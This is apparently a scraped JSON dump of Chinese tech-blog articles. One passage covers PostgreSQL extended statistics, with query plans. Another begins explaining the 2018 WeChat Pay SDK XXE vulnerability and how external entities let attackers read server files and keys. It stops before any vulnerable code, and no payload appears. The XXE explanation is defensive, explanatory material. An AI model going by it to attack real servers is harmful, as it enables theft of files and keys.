data-line=\"crayon-5b625fae345a6409144602-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5b625fae345a6409144602-11\">11</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b625fae345a6409144602-1\"><span class=\"crayon-i\">EXPLAIN</span> <span class=\"crayon-i\">ANALYZE</span> <span class=\"crayon-i\">SELECT</span> <span class=\"crayon-v\">col1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-v\">col2</span><span class=\"crayon-sy\">,</span><span class=\"crayon-e\">count</span><span class=\"crayon-sy\">(</span><span class=\"crayon-o\">*</span><span class=\"crayon-sy\">)</span> <span class=\"crayon-i\">from</span> <span class=\"crayon-i\">tbl</span> <span class=\"crayon-i\">group</span> <span class=\"crayon-i\">by</span> <span class=\"crayon-v\">col1</span><span class=\"crayon-sy\">,</span> <span class=\"crayon-v\">col2</span><span class=\"crayon-sy\">;</span>                   </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b625fae345a6409144602-2\">                                                         <span class=\"crayon-i\">QUERY</span> <span class=\"crayon-i\">PLAN</span>                                                          </div><div class=\"crayon-line\" id=\"crayon-5b625fae345a6409144602-3\"><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b625fae345a6409144602-4\"> <span class=\"crayon-i\">GroupAggregate</span>  <span class=\"crayon-sy\">(</span><span class=\"crayon-v\">cost</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">1990523.20..2091523.04</span> <span class=\"crayon-v\">rows</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">100000</span> <span class=\"crayon-v\">width</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">16</span><span class=\"crayon-sy\">)</span> <span class=\"crayon-sy\">(</span><span class=\"crayon-i\">actual</span> <span class=\"crayon-v\">time</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">2697.246..4470.789</span> <span class=\"crayon-v\">rows</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">1001</span> <span class=\"crayon-v\">loops</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5b625fae345a6409144602-5\">   <span class=\"crayon-i\">Group</span> <span class=\"crayon-v\">Key</span><span class=\"crayon-o\">:</span> <span class=\"crayon-v\">col1</span><span class=\"crayon-sy\">,</span> <span class=\"crayon-i\">col2</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b625fae345a6409144602-6\">   <span class=\"crayon-o\">-&gt;</span>  <span class=\"crayon-i\">Sort</span>  <span class=\"crayon-sy\">(</span><span class=\"crayon-v\">cost</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">1990523.20..2015523.16</span> <span class=\"crayon-v\">rows</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">9999984</span> <span class=\"crayon-v\">width</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">8</span><span class=\"crayon-sy\">)</span> <span class=\"crayon-sy\">(</span><span class=\"crayon-i\">actual</span> <span class=\"crayon-v\">time</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">2695.498..3440.880</span> <span class=\"crayon-v\">rows</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">10000000</span> <span class=\"crayon-v\">loops</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5b625fae345a6409144602-7\">         <span class=\"crayon-i\">Sort</span> <span class=\"crayon-v\">Key</span><span class=\"crayon-o\">:</span> <span class=\"crayon-v\">col1</span><span class=\"crayon-sy\">,</span> <span class=\"crayon-i\">col2</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b625fae345a6409144602-8\">         <span class=\"crayon-i\">Sort</span> <span class=\"crayon-v\">Method</span><span class=\"crayon-o\">:</span> <span class=\"crayon-i\">external</span> <span class=\"crayon-i\">sort</span>  <span class=\"crayon-v\">Disk</span><span class=\"crayon-o\">:</span> <span class=\"crayon-cn\">176128kB</span></div><div class=\"crayon-line\" id=\"crayon-5b625fae345a6409144602-9\">         <span class=\"crayon-o\">-&gt;</span>  <span class=\"crayon-i\">Seq</span> <span class=\"crayon-i\">Scan</span> <span class=\"crayon-i\">on</span> <span class=\"crayon-i\">tbl</span>  <span class=\"crayon-sy\">(</span><span class=\"crayon-v\">cost</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">0.00..144247.84</span> <span class=\"crayon-v\">rows</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">9999984</span> <span class=\"crayon-v\">width</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">8</span><span class=\"crayon-sy\">)</span> <span class=\"crayon-sy\">(</span><span class=\"crayon-i\">actual</span> <span class=\"crayon-v\">time</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">0.008..665.689</span> <span class=\"crayon-v\">rows</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">10000000</span> <span class=\"crayon-v\">loops</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b625fae345a6409144602-10\"> <span class=\"crayon-i\">Planning</span> <span class=\"crayon-v\">time</span><span class=\"crayon-o\">:</span> <span class=\"crayon-cn\">0.072</span> <span class=\"crayon-i\">ms</span></div><div class=\"crayon-line\" id=\"crayon-5b625fae345a6409144602-11\"> <span class=\"crayon-i\">Execution</span> <span class=\"crayon-v\">time</span><span class=\"crayon-o\">:</span> <span class=\"crayon-cn\">4494.583</span> <span class=\"crayon-v\">ms</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0052 seconds] -->\r\n<p>聚合行时，Postgres 选择做散列聚合或组合。 如果它认为散列表合适，则选择散列聚合，否则它会选择对所有行进行排序，然后按照 col1、col2 对它们进行分组。</p>\n<p>现在，planner 估计组的数量（等于 col1、col2 的不同值的数量）将为 100000。它预计到它没有足够的 work_mem 将该散列表存储在内存中。 因此，它使用基于磁盘的排序来运行该查询。 但是，正如在查询计划中所看到的那样，实际行数仅为 1001。也许，我们有足够的内存来执行哈希聚合。</p>\n<p>让 planner 去捕获 n_distinct 统计信息，重新运行查询并找出结果。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b625fae345ae542109179\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nCREATE STATISTICS s2 (ndistinct) on col1, col2 from tbl;                                  \r\nANALYZE tbl;\r\n\r\nEXPLAIN ANALYZE SELECT col1,col2,count(*) from tbl group by col1, col2;                   \r\n                                                      QUERY PLAN                                                       \r\n-----------------------------------------------------------------------------------------------------------------------\r\n HashAggregate  (cost=219247.63..219257.63 rows=1000 width=16) (actual time=2431.767..2431.928 rows=1001 loops=1)\r\n   Group Key: col1, col2\r\n   -&gt;  Seq Scan on tbl  (cost=0.00..144247.79 rows=9999979 width=8) (actual time=0.008..643.488 rows=10000000 loops=1)\r\n Planning time: 0.129 ms\r\n Execution time: 2432.010 ms\r\n(5 rows)</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b625fae345ae542109179-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b625fae345ae542109179-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b625fae345ae542109179-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b625fae345ae542109179-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b625fae345ae542109179-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b625fae345ae542109179-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b625fae345ae542109179-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b625fae345ae542109179-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5b625fae345ae542109179-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b625fae345ae542109179-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5b625fae345ae542109179-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b625fae345ae542109179-12\">12</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b625fae345ae542109179-1\"><span class=\"crayon-i\">CREATE</span> <span class=\"crayon-i\">STATISTICS</span> <span class=\"crayon-i\">s2</span> <span class=\"crayon-sy\">(</span><span class=\"crayon-v\">ndistinct</span><span class=\"crayon-sy\">)</span> <span class=\"crayon-i\">on</span> <span class=\"crayon-v\">col1</span><span class=\"crayon-sy\">,</span> <span class=\"crayon-i\">col2</span> <span class=\"crayon-i\">from</span> <span class=\"crayon-v\">tbl</span><span class=\"crayon-sy\">;</span>                                  </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b625fae345ae542109179-2\"><span class=\"crayon-i\">ANALYZE</span> <span class=\"crayon-v\">tbl</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b625fae345ae542109179-3\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b625fae345ae542109179-4\"><span class=\"crayon-i\">EXPLAIN</span> <span class=\"crayon-i\">ANALYZE</span> <span class=\"crayon-i\">SELECT</span> <span class=\"crayon-v\">col1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-v\">col2</span><span class=\"crayon-sy\">,</span><span class=\"crayon-e\">count</span><span class=\"crayon-sy\">(</span><span class=\"crayon-o\">*</span><span class=\"crayon-sy\">)</span> <span class=\"crayon-i\">from</span> <span class=\"crayon-i\">tbl</span> <span class=\"crayon-i\">group</span> <span class=\"crayon-i\">by</span> <span class=\"crayon-v\">col1</span><span class=\"crayon-sy\">,</span> <span class=\"crayon-v\">col2</span><span class=\"crayon-sy\">;</span>                   </div><div class=\"crayon-line\" id=\"crayon-5b625fae345ae542109179-5\">                                                      <span class=\"crayon-i\">QUERY</span> <span class=\"crayon-i\">PLAN</span>                                                       </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b625fae345ae542109179-6\"><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-</span></div><div class=\"crayon-line\" id=\"crayon-5b625fae345ae542109179-7\"> <span class=\"crayon-i\">HashAggregate</span>  <span class=\"crayon-sy\">(</span><span class=\"crayon-v\">cost</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">219247.63..219257.63</span> <span class=\"crayon-v\">rows</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">1000</span> <span class=\"crayon-v\">width</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">16</span><span class=\"crayon-sy\">)</span> <span class=\"crayon-sy\">(</span><span class=\"crayon-i\">actual</span> <span class=\"crayon-v\">time</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">2431.767..2431.928</span> <span class=\"crayon-v\">rows</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">1001</span> <span class=\"crayon-v\">loops</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b625fae345ae542109179-8\">   <span class=\"crayon-i\">Group</span> <span class=\"crayon-v\">Key</span><span class=\"crayon-o\">:</span> <span class=\"crayon-v\">col1</span><span class=\"crayon-sy\">,</span> <span class=\"crayon-i\">col2</span></div><div class=\"crayon-line\" id=\"crayon-5b625fae345ae542109179-9\">   <span class=\"crayon-o\">-&gt;</span>  <span class=\"crayon-i\">Seq</span> <span class=\"crayon-i\">Scan</span> <span class=\"crayon-i\">on</span> <span class=\"crayon-i\">tbl</span>  <span class=\"crayon-sy\">(</span><span class=\"crayon-v\">cost</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">0.00..144247.79</span> <span class=\"crayon-v\">rows</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">9999979</span> <span class=\"crayon-v\">width</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">8</span><span class=\"crayon-sy\">)</span> <span class=\"crayon-sy\">(</span><span class=\"crayon-i\">actual</span> <span class=\"crayon-v\">time</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">0.008..643.488</span> <span class=\"crayon-v\">rows</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">10000000</span> <span class=\"crayon-v\">loops</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b625fae345ae542109179-10\"> <span class=\"crayon-i\">Planning</span> <span class=\"crayon-v\">time</span><span class=\"crayon-o\">:</span> <span class=\"crayon-cn\">0.129</span> <span class=\"crayon-i\">ms</span></div><div class=\"crayon-line\" id=\"crayon-5b625fae345ae542109179-11\"> <span class=\"crayon-i\">Execution</span> <span class=\"crayon-v\">time</span><span class=\"crayon-o\">:</span> <span class=\"crayon-cn\">2432.010</span> <span class=\"crayon-e\">ms</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b625fae345ae542109179-12\"><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">5</span> <span class=\"crayon-v\">rows</span><span class=\"crayon-sy\">)</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0048 seconds] -->\r\n<p>可以看到，现在的估算精度更高了（即 1000 ），查询速度也提高了2倍左右。 通过运行下面的查询，我们可以看到 planner 学到了什么。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b625fae345b7809254037\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nSELECT stxkeys AS k, stxndistinct AS nd                                                   \r\n  FROM pg_statistic_ext                                                                   \r\n  WHERE stxname = 's2'; \r\n  k  |       nd       \r\n-----+----------------\r\n 1 2 | {\"1, 2\": 1000}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b625fae345b7809254037-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b625fae345b7809254037-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b625fae345b7809254037-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b625fae345b7809254037-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b625fae345b7809254037-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b625fae345b7809254037-6\">6</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b625fae345b7809254037-1\"><span class=\"crayon-i\">SELECT</span> <span class=\"crayon-i\">stxkeys</span> <span class=\"crayon-st\">AS</span> <span class=\"crayon-v\">k</span><span class=\"crayon-sy\">,</span> <span class=\"crayon-i\">stxndistinct</span> <span class=\"crayon-st\">AS</span> <span class=\"crayon-i\">nd</span>                                                   </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b625fae345b7809254037-2\">  <span class=\"crayon-i\">FROM</span> <span class=\"crayon-v\">pg_statistic</span><span class=\"crayon-sy\">_</span>ext                                                                   </div><div class=\"crayon-line\" id=\"crayon-5b625fae345b7809254037-3\">  <span class=\"crayon-i\">WHERE</span> <span class=\"crayon-i\">stxname</span> <span class=\"crayon-o\">=</span> <span class=\"crayon-s\">'s2'</span><span class=\"crayon-sy\">;</span> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b625fae345b7809254037-4\">  <span class=\"crayon-i\">k</span>  <span class=\"crayon-o\">|</span>       <span class=\"crayon-i\">nd</span>       </div><div class=\"crayon-line\" id=\"crayon-5b625fae345b7809254037-5\"><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-</span><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b625fae345b7809254037-6\"> <span class=\"crayon-cn\">1</span> <span class=\"crayon-cn\">2</span> <span class=\"crayon-o\">|</span> <span class=\"crayon-sy\">{</span><span class=\"crayon-s\">\"1, 2\"</span><span class=\"crayon-o\">:</span> <span class=\"crayon-cn\">1000</span><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0019 seconds] -->\r\n<p><strong>现实影响</strong></p>\n<p>在实际的生产模式中，你总是会有某些与数据库不知道的相互依赖或关系的列。 以下是我们与 <a href=\"https://www.citusdata.com/product/\" rel=\"nofollow\">Citus</a> 客户见过的一些例子：</p>\n<ul>\n<li>有月份，季度和年份的列，因为你希望在报告中显示按所有人分组的统计信息。</li>\n<li>地理层次之间的关系。 例如。 具有国家，州和城市的列，并由它们来过滤/分组。</li>\n</ul>\n<p>这里的例子仅仅是在数据集中只有 10M 行的情况，并且我们已经看到，在存在相关列的情况下，使用 CREATE 统计信息可显着改善查询计划，并显示性能改进。在 Citus 使用案例中，我们有<a href=\"https://www.citusdata.com/customers/\" rel=\"nofollow\">客户</a>存储数十亿行数据，糟糕查询计划的影响可能非常严重。在上述示例中，当 planner 选择了一个糟糕的查询计划时，我们不得不为 10M 行做一个基于磁盘的分类。想象一下如果是数十亿行，那会有多糟糕。</p>\n<p> </p>\n<p> </p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"114232\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"114232votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"114232\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i>  收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_path": "full/d925c992a1aa410e25f0bb681dae99423f162420.jpg"},{"url_object_id": "f2c4471ed0ef1f9a2f5eb6a1621f2f3b", "title": ["谈谈微信支付曝出的漏洞"], "url": "http://blog.jobbole.com/114197/", "create_date": "2018/07/06", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2016/09/3fb6592ac92133a71f0ae78e43683e83.jpg"], "praise_nums": "1", "comment_nums": 0, "fav_nums": 1, "tags": "IT技术, 安全", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a target=\"_blank\" href=\"http://www.cnblogs.com/kismetv/p/9266224.html\">编程迷思</a>   </div><h1>一、背景</h1>\n<p>昨天（2018-07-04）微信支付的SDK曝出重大漏洞（XXE漏洞），通过该漏洞，攻击者可以获取服务器中目录结构、文件内容，如代码、各种私钥等。获取这些信息以后，攻击者便可以为所欲为，其中就包括众多媒体所宣传的“0元也能买买买”。</p>\n<p>漏洞报告地址；http://seclists.org/fulldisclosure/2018/Jul/3</p>\n<h1>二、漏洞原理</h1>\n<h2>1.  XXE漏洞</h2>\n<p>此次曝出的漏洞属于XXE漏洞，即XML外部实体注入（XML External Entity Injection）。</p>\n<p>XML文档除了可以包含声明和元素以外，还可以包含文档类型定义（即DTD）；如下图所示。</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/07/fd852c808e1da4c7f569a8ac7e846bb6.png\" alt=\"\"></p>\n<p>在DTD中，可以引进实体，在解析XML时，实体将会被替换成相应的引用内容。该实体可以由外部引入(支持http、ftp等协议，后文以http为例说明)，如果通过该外部实体进行攻击，就是XXE攻击。</p>\n<p>可以说，<strong>XXE漏洞之所以能够存在，本质上在于在解析XML的时候，可以与外部进行通信；当XML文档可以由攻击者任意构造时，攻击便成为可能。</strong>在利用XXE漏洞可以做的事情当中，最常见最容易实现的，便是读取服务器的信息，包括目录结构、文件内容等；本次微信支付爆出的漏洞便属于这一种。</p>\n<h2>2.  微信支付漏洞</h2>\n<p>本次漏洞影响的范围是：在微信支付异步回调接口中，使用微信支付SDK进行XML解析的应用。注意这里的SDK是服务器端的SDK，APP端使用SDK并不受影响。</p>\n<p>SDK下载地址如下（目前微信官方宣传漏洞已修复）：https://pay.weixin.qq.com/wiki/doc/api/download/WxPayAPI_JAVA_v3.zip</p>\n<p>SDK中导致漏洞的代码是WXPayUtil工具类中的xmlToMap()方法：</p>\n<p><img 